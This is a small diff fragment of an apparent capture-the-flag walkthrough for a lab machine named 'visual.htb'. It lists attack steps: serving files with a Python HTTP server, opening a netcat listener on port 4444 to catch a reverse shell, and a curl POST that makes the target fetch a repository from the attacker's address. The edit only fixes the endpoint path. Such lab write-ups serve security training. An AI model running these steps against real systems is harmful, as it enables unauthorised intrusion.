@@ -7,4 +7,4 @@
     - ```python3 -m http.server 8000```
 
 4. ```nc -lnvp 4444``` 
-5. ```curl visual.htb -X POST -d 'gitRepoLink=http://<YOUR_IP>:8000'```
+5. ```curl visual.htb/submit.php -X POST -d 'gitRepoLink=http://<YOUR_IP>:8000'```
